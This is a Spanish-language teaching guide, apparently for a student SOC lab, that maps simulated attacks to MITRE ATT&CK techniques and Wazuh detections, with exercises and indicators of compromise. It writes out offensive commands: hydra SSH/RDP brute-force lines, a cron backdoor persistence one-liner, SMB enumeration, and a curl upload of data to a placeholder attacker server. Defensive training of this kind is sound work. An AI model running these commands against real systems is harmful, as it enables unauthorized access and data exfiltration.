# Escenarios de Ataque y MITRE ATT&CK Framework

## Descripción General

Este documento describe los escenarios de ataque educativo que se pueden simular en el SOC, alineados con el **framework MITRE ATT&CK**, que categoriza las técnicas y tácticas utilizadas por adversarios en ataques reales.

**Enfoque**: Todos los ataques son **simulados y controlados** con propósito defensivo educativo, cumpliendo principios éticos y legales.

---

## Escenarios de Ataque Educativo

### 1. Reconocimiento y Escaneo de Red

**Descripción**: Mapeo inicial de la red para identificar hosts activos y servicios disponibles.

**Técnica MITRE ATT&CK**: **T1046 - Network Service Discovery**

**Actividades simuladas**:
- Escaneo con `nmap` desde Kali Linux
- Identificación de puertos abiertos
- Detección de servicios activos
- Identificación de OS y versiones

**Eventos generados**:
- Intentos múltiples de conexión fallidos
- Traffic en múltiples puertos
- Scans de puertos bajo (1-1024)

**Detección en Wazuh**:
- Alertas por conexiones rechazadas
- Patrón de múltiples conexiones fallidas
- Análisis de anomalías de tráfico

---

### 2. Fuerza Bruta sobre SSH y RDP

**Descripción**: Intentos automatizados para acceder a sistemas mediante credenciales débiles.

**Técnicas MITRE ATT&CK**:
- **T1110 - Brute Force** (General)
- **T1110.001 - Password Guessing**
- **T1110.004 - Credential Stuffing**

**Actividades simuladas**:

#### Linux - SSH Brute Force
```bash
# Herramienta: hydra
hydra -l usuario -P /path/to/wordlist ssh://target_ip
```

**Eventos generados** (logs SSH):
- Múltiples intentos fallidos de login
- Event ID: Múltiples "authentication failure"
- Cambio en frecuencia de intentos fallidos

#### Windows - RDP Brute Force
```bash
# Herramienta: hydra
hydra -l Administrator -P /path/to/wordlist rdp://target_ip
```

**Eventos generados** (Event ID Windows):
- **4625**: Logon failure
- Múltiples intentos en corto período
- Cambios en patrón de acceso normal

**Detección en Wazuh**:
- Reglas para múltiples fallos (SSH: >5 en 5 min)
- Correlación de eventos
- Alertas por anomalía en patrón de acceso

---

### 3. Acceso Inicial con Credenciales Válidas

**Descripción**: Acceso exitoso tras fuerza bruta o compromiso de credenciales.

**Técnica MITRE ATT&CK**: **T1078 - Valid Accounts**

**Actividades simuladas**:
- Login exitoso tras múltiples intentos fallidos
- Acceso desde IP sospechosa
- Login fuera de horario laboral
- Acceso desde múltiples IPs en corto período

**Eventos generados**:
- Evento de login exitoso
- Cambio de contexto de seguridad
- Inicio de sesión nueva

**Detección en Wazuh - Correlación de eventos**:
```
[Evento 1] Múltiples fallos de autenticación (T1110)
    ↓
[Evento 2] Login exitoso (T1078)
    ↓
[Alerta] "Acceso exitoso tras fuerza bruta"
```

---

### 4. Escalada de Privilegios

**Descripción**: Obtención de permisos administrativos o de root para expandir control del sistema.

**Técnicas MITRE ATT&CK**:
- **T1068 - Exploitation for Privilege Escalation**
- **T1548.004 - Use Elevated Privileges**

**Actividades simuladas**:

#### Linux
```bash
# Método 1: sudo con credenciales válidas
sudo -l
sudo su -

# Método 2: Exploit de vulnerabilidad conocida
# (simulado con permisos mal configurados)
```

**Eventos generados**:
- Intentos de uso de `sudo`
- Cambio a usuario root
- Cambios en permisos de archivos

#### Windows
```powershell
# Simulación de UAC bypass
# Cambio de contexto a SYSTEM
```

**Eventos generados** (Event ID):
- **4625**: Logon failure (si falla escalada)
- **4672**: Special privileges assigned
- **4697**: A service was installed in the system

**Detección en Wazuh**:
- Monitoreo de sudoers
- Alertas por cambios en permisos
- Detección de archivos SUID modificados

---

### 5. Persistencia

**Descripción**: Mecanismos para mantener acceso al sistema tras desconexión.

**Técnicas MITRE ATT&CK**:
- **T1053 - Scheduled Task/Job**
- **T1547 - Boot or Logon Autostart Execution**
- **T1547.008 - LSASS Driver**

**Actividades simuladas**:

#### Linux - Cron Jobs
```bash
# Crear tarea cron maliciosa (simulada)
(crontab -l 2>/dev/null; echo "0 */6 * * * /tmp/backdoor.sh") | crontab -
```

**Eventos generados**:
- Modificación de archivos cron
- Cambios en `/etc/crontab`
- Cambios en archivos de arranque

#### Windows - Scheduled Tasks
```powershell
# Crear tarea programada
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe"
Register-ScheduledTask -TaskName "SystemUpdate" -Action $Action
```

**Eventos generados** (Event ID):
- **4698**: A scheduled task was created
- **4702**: A scheduled task was updated

**Detección en Wazuh**:
- FIM (File Integrity Monitoring) en directorios de arranque
- Alertas por creación de cron jobs
- Monitoreo de registro de tareas programadas

---

### 6. Movimiento Lateral

**Descripción**: Expansión de acceso dentro de la red a otros sistemas.

**Técnica MITRE ATT&CK**: **T1021 - Remote Services**

**Actividades simuladas**:

#### Explotación de Samba/SMB
```bash
# Enumeración de recursos compartidos
enum4linux target_ip

# Acceso a shares con credenciales capturadas
smbclient //target_ip/share -U usuario
```

#### Uso de WinRM (Windows)
```powershell
# Acceso remoto en Windows
Invoke-Command -ComputerName target -ScriptBlock { Get-Process }
```

#### SSH/RDP lateral
- Uso de credenciales comprometidas en otros sistemas
- Salto entre máquinas (pivoting)

**Eventos generados**:
- Conexiones SMB entre sistemas
- Transferencia de archivos
- Accesos remotos

**Detección en Wazuh**:
- Monitoreo de conexiones externas
- Correlación entre eventos en múltiples agentes
- Alertas por movimiento anómalo de red

---

### 7. Ejecución de Malware Simulado

**Descripción**: Descarga y ejecución de código malicioso (simulado).

**Técnica MITRE ATT&CK**: **T1059 - Command and Scripting Interpreter**

**Actividades simuladas**:

#### Linux
```bash
# Script de bash simulado malicioso
echo "#!/bin/bash
# Simulación de acciones maliciosas
touch /tmp/malware_marker
" > /tmp/malware.sh

chmod +x /tmp/malware.sh
/tmp/malware.sh
```

#### Windows - PowerShell
```powershell
# Script PowerShell simulado
$file = New-Item -Path "C:\temp\malware_marker.txt"
# Simulación de acciones
```

**Eventos generados**:
- Creación/modificación de archivos ejecutables
- Ejecución de scripts
- Cambios en el registro (Windows)
- Comportamiento anómalo del proceso

**Detección en Wazuh**:
- Reglas de detección de malware simulado
- Monitoreo de creación de ejecutables
- Análisis de comportamiento de procesos
- Alertas por ejecución de scripts sospechosos

---

### 8. Exfiltración de Información Simulada

**Descripción**: Transferencia de datos sensibles fuera de la red (simulada).

**Técnica MITRE ATT&CK**: **T1041 - Exfiltration Over C2 Channel**

**Actividades simuladas**:

#### Transferencia de Archivos
```bash
# SCP (Secure Copy)
scp /path/to/sensitive_file usuario@target:/tmp/

# Compresión y envío
tar czf data.tar.gz /path/to/sensitive/
scp data.tar.gz usuario@target:/tmp/
```

#### HTTP/HTTPS Upload (simulado)
```bash
# Simulación de exfiltración via HTTP
curl -F "file=@/path/to/data" http://attacker_server/upload
```

**Eventos generados**:
- Transferencias de archivos
- Comunicaciones de red inusuales
- Acceso a archivos sensibles

**Detección en Wazuh**:
- Monitoreo de transferencias de archivos
- Alertas por acceso a datos sensibles
- Análisis de tráfico de red (con Suricata)
- Correlación de eventos de acceso + transferencia

---

## Tabla Resumen: Ataque → Técnica MITRE → Evento

| # | Escenario | Técnica MITRE | Evento/Indicador | Alertas Wazuh |
|---|-----------|---------------|------------------|---------------|
| 1 | Escaneo | T1046 | Múltiples intentos fallidos | Conexiones rechazadas |
| 2 | Fuerza bruta SSH | T1110.001 | Auth failure logs | 5+ fallos en 5 min |
| 3 | Fuerza bruta RDP | T1110.001 | Event ID 4625 | 5+ logon failures |
| 4 | Acceso válido | T1078 | Logon exitoso | Correlación fallo→éxito |
| 5 | Escalada | T1068 | sudo/UAC usage | 4698/4672 events |
| 6 | Persistencia | T1053 | Cron/Scheduled task | FIM changes |
| 7 | Movimiento lateral | T1021 | SMB/SSH/RDP | Multiple connections |
| 8 | Ejecución | T1059 | Script execution | Process creation |
| 9 | Exfiltración | T1041 | File transfer | Network anomalies |

---

## Prácticas para el Alumnado

### Práctica 1 – Reconocimiento de Red

**Objetivo**: Identificar técnicas de escaneo y su detección

**Procedimiento**:
1. Desde Kali Linux, ejecutar escaneo de red: `nmap -p- 10.68.0.0/24`
2. Revisar en Wazuh los eventos generados
3. Identificar alertas en Kibana
4. Analizar logs de firewall/IDS si está disponible
5. Documentar indicadores de compromiso (IoC)

**Competencias desarrolladas**:
- Análisis de conexiones múltiples
- Identificación de patrones de escaneo
- Correlación de eventos

---

### Práctica 2 – Detección de Fuerza Bruta

**Objetivo**: Simular y detectar intentos de acceso no autorizados

**Procedimiento Linux**:
1. Desde Kali: `hydra -l usuario -P /path/to/wordlist ssh://10.68.0.161`
2. Monitorear en Kibana: Filtro por host y SSH
3. Verificar conteo de eventos 4625 / auth failures
4. Crear regla de alerta personalizada
5. Documentar tiempo de detección

**Procedimiento Windows**:
1. Desde Kali: `hydra -l Administrator -P /path/to/wordlist rdp://10.68.0.163`
2. Monitorear eventos Windows (Event ID 4625)
3. Correlacionar múltiples fallos
4. Analizar patrón temporal

**Competencias desarrolladas**:
- Detección de intentos fallidos
- Análisis de eventos 4625 y logs SSH
- Correlación temporal de eventos
- Creación de reglas personalizadas

---

### Práctica 3 – Análisis de Accesos Sospechosos

**Objetivo**: Detectar accesos válidos tras fuerza bruta y anomalías

**Procedimiento**:
1. Ejecutar ataque de fuerza bruta seguido de acceso válido
2. En Kibana, buscar correlación: `auth.failed AND auth.success`
3. Analizar:
   - Diferencia temporal entre fallo y éxito
   - IP origen
   - Horario de acceso
4. Crear dashboard temático
5. Generar alertas correlacionadas

**Análisis avanzado**:
- Comparar patrón horario vs. acceso sospechoso
- Detectar acceso fuera de horario
- Identificar usuarios con múltiples sesiones simultáneas

**Competencias desarrolladas**:
- Correlación login fallido → exitoso
- Detección de anomalías horarias
- Análisis de contexto de acceso
- Investigación forense

---

## Indicadores de Compromiso (IoC)

### SSH/Linux
```
- Múltiples "authentication failure" en auth.log
- Conexión exitosa tras 5+ fallos
- Login desde IP conocida comprometida
- Uso de sudo sin auditoría
```

### RDP/Windows
```
- Event ID 4625 (Logon Failure) > 5 en 5 min
- Event ID 4624 (Logon Success) desde IP anómala
- Event ID 4672 (Special Privileges Assigned)
- Event ID 4698 (Scheduled Task Created)
```

### Ficheros/Sistema
```
- Modificación de /etc/crontab sin cambios esperados
- Cambio en permisos de archivos críticos
- Creación de ejecutables en /tmp
- Modificación de archivos de boot
```

### Red
```
- Conexiones a múltiples puertos en secuencia
- Transferencias de ficheros inusuales
- Comunicación con IPs externas conocidas maliciosas
- Tráfico HTTP/HTTPS anómalo
```

---

## Escalabilidad Futura

### Ataques Adicionales
- **Ransomware simulado**: Encriptación de archivo de prueba
- **Exfiltración detectada**: Transferencia de datos a servidor externo controlado
- **Persistencia avanzada**: Rootkit de modo usuario
- **Lateral movement**: Kerberoasting en entornos AD

### Herramientas de Simulación
- **CALDERA**: Plataforma de simulación de adversarios (ATT&CK)
- **Atomic Red Team**: Scripts de prueba por técnica MITRE
- **PentestGPT**: Automatización de pruebas

### Integraciones
- **Suricata/Snort**: Detección de intrusiones en red (IDS)
- **Alertas por Telegram**: Notificaciones en tiempo real
- **Dashboards temáticos por MITRE**: Visualización de cobertura

---

## Conclusión

Este documento proporciona un framework educativo completo para:

✓ Comprender técnicas de ataque reales (MITRE ATT&CK)
✓ Simular escenarios de forma controlada y ética
✓ Detectar y responder ante incidentes
✓ Desarrollar competencias de ciberseguridad defensiva
✓ Preparar al alumnado para SOCs profesionales

**Todos los escenarios están diseñados para entornos educativos controlados y cumplen principios éticos y legales.**
**Última actualización**: Mayo 2026
